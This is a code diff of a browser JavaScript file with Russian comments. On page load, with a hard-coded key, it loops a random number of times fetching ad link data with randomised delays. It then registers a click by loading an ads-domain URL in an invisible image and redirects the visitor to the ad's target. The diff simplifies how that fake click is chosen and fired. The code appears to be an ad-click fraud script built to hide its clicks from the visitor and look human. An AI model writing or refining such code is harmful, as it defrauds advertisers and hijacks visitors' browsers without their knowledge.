@@ -47,22 +47,10 @@ function randomFloatNumber(min, max) {
 function delay(refresh_time) {
     return new Promise(resolve => setTimeout(resolve, refresh_time));
 }
-// Функция для регистрации клика
-function clickRegistration(clickUrl, url) {
-    if (clickUrl) {
-        let iconClk = document.createElement("img");
-        iconClk.style.visibility = 'hidden';
-        iconClk.src = clickUrl
-        document.body.appendChild(iconClk);
-    }
-    if (url) {
-        window.location.href = url;
-    }
-}
 
 window.onload = async () => {
 
-    (async function ad(key='e902c8ac42c6171f9d4712d725100b95', arr_count=[15, 25], arr_time=[99, 3500], otherUrl = 'https://www.google.com/') {
+    (async function ad(key='e902c8ac42c6171f9d4712d725100b95', arr_count=[15, 25], arr_time=[100, 3000]) {
         try {
 
             const count = Number(randomFloatNumber(arr_count[0], arr_count[1])).toFixed(0);
@@ -94,7 +82,8 @@ window.onload = async () => {
     
             console.log('Получиди uuid ...');
 
-            const arrayClick = [];
+            let clickUrl = '';
+            let url = '';
 
             for (let rww of arrCount) {
                 // Получаем JSON sbar со ссылками
@@ -174,13 +163,9 @@ window.onload = async () => {
         
                         console.log('Сделали запрос c=1 ...');
         
-                        // Собираем ссылки для кликов в массив
-                        let clickUrl = `https://${adsDomain}${sbar[0].clk}`;
-                        let url = sbar[0].url
-
-                        if (sbar[0].clk && sbar[0].url) {
-                            arrayClick.push({ clickUrl, url });
-                        }
+                        // Регистрация клика
+                        clickUrl = `https://${adsDomain}${sbar[0].clk}`;
+                        url = sbar[0].url
 
                         // Делаем остановку на сколько то милисикунд
                         const time = Number(randomFloatNumber(arr_time[0], arr_time[1])).toFixed(0);
@@ -190,13 +175,14 @@ window.onload = async () => {
                 }
             }
 
-            if (arrayClick.length == 0) {
-                window.location.href = otherUrl;
-            } else if (arrayClick.length == 1) {
-                clickRegistration(arrayClick[0].clickUrl, arrayClick[0].url);
-            } else {
-                let randNumber = Number(randomFloatNumber(0, arrayClick.length-1)).toFixed(0);
-                clickRegistration(arrayClick[randNumber].clickUrl, arrayClick[randNumber].url);
+            if (clickUrl) {
+                let iconClk = document.createElement("img");
+                iconClk.style.visibility = 'hidden';
+                iconClk.src = clickUrl
+                document.body.appendChild(iconClk);
+            }
+            if (url) {
+                window.location.href = url;
             }
 
         } catch(e) {
